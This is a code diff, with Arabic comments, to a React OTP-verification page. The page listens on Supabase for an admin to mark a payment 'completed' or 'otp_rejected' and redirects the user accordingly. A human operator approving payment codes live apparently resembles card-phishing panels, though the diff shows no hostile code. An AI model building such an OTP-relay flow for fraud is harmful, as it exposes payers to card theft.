@@ -125,9 +125,9 @@ const OtpVerification = () => {
     }
   }, [verificationStatus, waitingApproval]);
 
-  // Listen for admin approval/rejection
+  // Listen for admin approval/rejection - بدء الاستماع فور دخول الصفحة
   useEffect(() => {
-    if (!waitingApproval) return;
+    if (!paymentId && !orderData.sequenceNumber) return;
 
     if (paymentId) {
       const channel = supabase
@@ -141,21 +141,21 @@ const OtpVerification = () => {
           const newStatus = payload.new.payment_status;
           if (newStatus === 'completed') {
             setWaitingApproval(false);
-            setVerificationStatus("loading");
+            setVerificationStatus("success");
             
-            // عرض رسائل التحميل لمدة 5 ثواني
+            // عرض رسالة النجاح لمدة 2 ثانية ثم الانتقال للصفحة الرئيسية
             setTimeout(() => {
               window.location.href = "/";
-            }, 5000);
+            }, 2000);
           } else if (newStatus === 'otp_rejected') {
             setWaitingApproval(false);
-            setVerificationStatus("loading");
+            setVerificationStatus("error");
             
-            // عرض رسائل التحميل لمدة 5 ثواني ثم العودة لصفحة التحقق
+            // عرض رسالة الخطأ لمدة 3 ثواني ثم العودة لصفحة التحقق
             setTimeout(() => {
               setVerificationStatus("idle");
               setOtp("");
-            }, 5000);
+            }, 3000);
           }
         })
         .subscribe();
@@ -191,7 +191,7 @@ const OtpVerification = () => {
     return () => {
       supabase.removeChannel(channel);
     };
-  }, [paymentId, orderData.sequenceNumber, waitingApproval, navigate]);
+  }, [paymentId, orderData.sequenceNumber, navigate]);
 
   const handleResendCode = () => {
     toast({
